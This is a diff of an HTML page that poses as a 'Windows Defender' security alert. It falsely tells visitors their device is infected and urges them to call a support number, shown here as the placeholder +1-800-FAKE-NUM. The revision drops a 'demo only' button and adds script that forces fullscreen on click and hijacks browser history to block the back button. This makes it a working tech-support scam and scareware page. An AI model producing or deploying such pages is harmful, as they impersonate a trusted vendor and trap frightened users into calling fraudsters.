@@ -1,76 +1,47 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Windows Defender Alert</title>
+  <meta charset="UTF-8">
+  <title>Security Alert</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
       margin: 0;
-      padding: 0;
-      background-color: #000;
+      padding: 20px;
+      background: black;
       color: white;
-      font-family: Arial, sans-serif;
+      font-family: sans-serif;
       text-align: center;
     }
-    .alert-box {
+    .box {
+      background: #222;
       padding: 20px;
-      margin-top: 50px;
-      background: #1c1c1c;
       border: 2px solid red;
       border-radius: 10px;
-      width: 90%;
-      margin-left: auto;
-      margin-right: auto;
-    }
-    .alert-title {
-      font-size: 20px;
-      color: red;
-      font-weight: bold;
-    }
-    .alert-msg {
-      margin-top: 15px;
-      font-size: 16px;
-    }
-    .call-box {
-      background: #222;
-      padding: 10px;
-      margin-top: 20px;
-      border-radius: 8px;
-      border: 1px solid #444;
-    }
-    .call-box span {
-      font-size: 18px;
-      color: #0f0;
-    }
-    .btn {
-      margin-top: 20px;
-      padding: 10px 20px;
-      background: red;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
     }
   </style>
   <script>
-    document.addEventListener("DOMContentLoaded", function () {
-      alert("Windows Defender Alert:\nMalware Detected!\nPlease call support immediately.");
+    // Force fullscreen (for supported browsers)
+    document.addEventListener("click", function () {
+      let el = document.documentElement;
+      if (el.requestFullscreen) el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
     });
+
+    // Push fake history to block back button
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+      alert("⚠️ Security Warning: You cannot go back from this page!");
+      history.pushState(null, null, location.href); // Push again to prevent exit
+    };
   </script>
 </head>
 <body>
-  <div class="alert-box">
-    <div class="alert-title">⚠️ Windows Defender - Security Alert</div>
-    <div class="alert-msg">
-      Your device is infected with malware.<br />
-      Detected threats may steal personal information.<br />
-      Do not close this page!
-    </div>
-    <div class="call-box">
-      Call Windows Support: <br /><span>+1-800-FAKE-NUM</span>
-    </div>
-    <button class="btn" onclick="alert('Calling support... (demo only)')">Call Now</button>
+  <div class="box">
+    <h2>⚠️ Windows Defender Alert</h2>
+    <p>Malware has been detected on your device.</p>
+    <p>Call support immediately at: <strong>+1-800-FAKE-NUM</strong></p>
+    <p>Do not press back. Your data is at risk.</p>
   </div>
 </body>
 </html>
